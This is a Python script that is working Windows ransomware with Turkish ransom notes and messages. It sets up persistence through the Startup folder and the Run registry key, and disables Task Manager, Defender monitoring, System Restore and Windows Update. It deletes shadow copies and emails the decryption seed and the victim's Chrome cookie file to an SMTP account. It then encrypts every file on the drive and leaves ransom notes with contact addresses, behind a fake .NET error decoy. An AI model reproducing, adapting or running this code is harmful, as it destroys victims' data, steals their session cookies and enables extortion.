import base64
import os
import random
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import winreg
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import getpass
import string
import ctypes
import shutil
import os
import time
import sys
import random
import string


def disable():
    try:
        os.system(f'copy finder.exe C:\\ >nul')
        shutil.copy2('finder.exe', 'C:\\Windows\\system32.exe')
        src = f"C:\\finder.exe"
        src2 = f"C:\\Windows\\system32.exe"
        dst = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shutil.copy2(src, dst)
        shutil.copy2(src2, dst)
    except:
        pass
    try:
        source_file = 'C:\\Windows\\system32.exe'
        subprocess.Popen(
            'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Your_program_name" /t REG_SZ /d "' + source_file + '" /f',
            shell=True)
    except:
        pass
    try:
        os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul')
    except:
        pass
    try:
        subprocess.call('powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true')
    except:
        pass
    try:
        os.system("wmic shadowcopy delete >nul")
    except:
        pass
    try:
        subprocess.run("wmic.exe /namespace:\\root\default path SystemRestore call Disable", shell=True)
    except:
        pass
    try:
        key2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Microsoft\Windows\WindowsUpdate", 0,
                             winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key2, "AutoUpdate", 0, winreg.REG_DWORD, 0)
    except:
        pass



def sendmail(mail_content,subject,username,salt):
    sender_address = 'GÖNDERİCİ YANDEX MAİL'
    senderkal = 'YANDEX SMPT ŞİFRESİ'
    receiver_address = 'ALICI YANDEX MAİL'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = f"{subject}"
    message.attach(MIMEText(f"RANDTI Value:  {mail_content} Salt Value:  {salt}", 'plain'))

    try:
        filename = f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
        attachment = open(filename, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        message.attach(part)
    except:
        pass

    session = smtplib.SMTP_SSL('smtp.yandex.com.tr', 465)
    session.login(sender_address, senderkal)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()

def random_string(string_length=10):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(string_length))


def encrypt_all_files(password,salt3,pcno):

    try:
        with open("C:\\OKU.txt", "w",encoding="utf-8") as f:
            f.write(
                f"{getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Kullanıcı Kodun ile İletişime Geçmelisin. \n test@proton.me \n test@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
    except:
        pass


    salt = salt3

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        iterations=10000,
        length=32,
        salt=salt,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    f = Fernet(key)
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file != "OKU.txt":
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as file:
                        encrypted_data = f.encrypt(file.read())
                    with open(file_path, "wb") as file:
                        file.write(salt + encrypted_data)
                except Exception as e:
                    pass

    for root, dirs, files in os.walk("/"):
        try:
            with open(os.path.join(root, 'OKU.txt'), 'w',encoding="utf-8") as f:
                f.write(f" {getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Hesap İsmin ile İletişime Geçmelisin. \n test@proton.me \n test@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
        except:
            pass


    try:
        with open("OKU.txt", "w",encoding="utf-8") as f:
            f.write(
                f"{getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Kullanıcı Kodun ile İletişime Geçmelisin. \n test@proton.me \n test@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
    except:
        pass



def secret():
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        ctypes.windll.user32.MessageBoxW(None, "Lütfen yönetici olarak çalıştırınız", "HATA", 0x40 | 0x1)
        exit()
    else:
        salt3 = os.urandom(16)
        usernamedesktop = getpass.getuser()
        disable()
        rn = random.randint(111111,999999)
        topsav = f"*]{rn}[*   Kullanıcı Adı: {usernamedesktop}"
        pcno = random.randint(1111,999921231231235234)
        ctypes.windll.user32.MessageBoxW(None, "Net.Framwork Güncel Değil !", "HATA", 0x40 | 0x1)
        sendmail(topsav,pcno,usernamedesktop,salt3)
        encrypt_all_files(bytes(rn),salt3,pcno)


secret()
